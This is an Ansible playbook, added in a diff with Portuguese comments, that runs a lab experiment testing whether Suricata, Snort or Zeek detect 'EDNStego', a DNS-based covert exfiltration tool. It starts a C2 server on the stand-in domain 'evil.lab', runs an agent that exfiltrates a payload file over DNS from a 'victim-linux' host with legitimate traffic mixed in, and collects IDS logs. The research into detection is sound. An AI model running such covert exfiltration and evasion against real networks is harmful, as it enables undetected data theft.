@@ -1,0 +1,117 @@
+---
+- name: Executar teste EDNStego
+  hosts: localhost
+  vars:
+    technique: "t1"
+    solution: "suricata"
+    duration: 600
+    baseline_duration: 300
+    payload_file: "/opt/edns0-lab/sample-payload.bin"
+    c2_domain: "evil.lab"
+    timestamp: "{{ ansible_date_time.epoch }}"
+    force_fragmentation: false
+    legit_ratio: 0
+    test_malformed: false
+
+  tasks:
+    # 1. Iniciar captura de tráfego
+    - name: Iniciar tcpdump no monitor
+      delegate_to: traffic-monitor
+      ansible.builtin.shell: |
+        nohup tcpdump -i ens3 -w \
+          /home/researcher/pcaps/{{ solution }}_{{ technique }}_{{ timestamp }}.pcap \
+          port 53 &
+      async: "{{ duration | int + baseline_duration | int + 120 }}"
+      poll: 0
+
+    # 2. Gerar tráfego baseline
+    - name: Gerar trafego DNS legitimo
+      delegate_to: victim-linux
+      ansible.builtin.shell: |
+        cd ~/edns0-lab/tools/ednstego && \
+        python3 traffic_gen.py \
+          --mode baseline \
+          --duration {{ baseline_duration }} \
+          --resolver 10.0.1.2 \
+          --domains-file data/tranco-top1000.txt
+
+    - name: Aguardar baseline
+      ansible.builtin.pause:
+        seconds: 10
+
+    # 3. Iniciar servidor C2
+    - name: Iniciar EDNStego server
+      delegate_to: c2-server
+      ansible.builtin.shell: |
+        cd ~/edns0-lab/tools/ednstego && \
+        nohup python3 server.py \
+          --domain {{ c2_domain }} \
+          --listen 0.0.0.0 \
+          --log-dir ./logs/{{ solution }}_{{ technique }}_{{ timestamp }} &
+      async: "{{ duration | int + 60 }}"
+      poll: 0
+
+    - name: Aguardar servidor C2 subir
+      ansible.builtin.pause:
+        seconds: 5
+
+    # 4. Executar técnica de evasão (com tráfego legítimo misturado)
+    - name: Iniciar trafego legitimo concorrente
+      delegate_to: victim-linux
+      ansible.builtin.shell: |
+        cd ~/edns0-lab/tools/ednstego && \
+        nohup python3 traffic_gen.py \
+          --mode baseline \
+          --duration {{ duration }} \
+          --resolver 10.0.1.2 \
+          --domains-file data/tranco-top1000.txt \
+          --rate {{ legit_ratio | default(10, true) }} &
+      async: "{{ duration | int + 60 }}"
+      poll: 0
+
+    - name: Executar agente EDNStego
+      delegate_to: victim-linux
+      ansible.builtin.shell: |
+        cd ~/edns0-lab/tools/ednstego && \
+        python3 agent.py \
+          --server {{ c2_domain }} \
+          --resolver 10.0.1.2 \
+          --mode {{ technique }} \
+          --exfil {{ payload_file }} \
+          --duration {{ duration }}
+      register: agent_result
+
+    # 5. Coletar resultados
+    - name: Coletar logs Suricata
+      delegate_to: fw-test
+      ansible.builtin.shell: |
+        cp /var/log/suricata/eve.json \
+          /home/researcher/results/{{ solution }}/{{ technique }}_{{ timestamp }}_eve.json
+      when: solution == 'suricata'
+      ignore_errors: yes
+
+    - name: Coletar logs Snort
+      delegate_to: fw-test
+      ansible.builtin.shell: |
+        cp /var/log/snort/alert_json.txt \
+          /home/researcher/results/{{ solution }}/{{ technique }}_{{ timestamp }}_alert.json
+      when: solution == 'snort'
+      ignore_errors: yes
+
+    - name: Coletar logs Zeek
+      delegate_to: dns-resolver
+      ansible.builtin.shell: |
+        cp /opt/zeek/logs/current/dns.log \
+          /home/researcher/results/{{ solution }}/{{ technique }}_{{ timestamp }}_dns.log
+      when: solution == 'pihole-zeek'
+      ignore_errors: yes
+
+    # 6. Parar captura
+    - name: Parar tcpdump
+      delegate_to: traffic-monitor
+      ansible.builtin.shell: pkill -f tcpdump
+      ignore_errors: yes
+
+    - name: Resultado do teste
+      ansible.builtin.debug:
+        msg: "Teste {{ solution }}/{{ technique }} concluido. PCAP salvo."
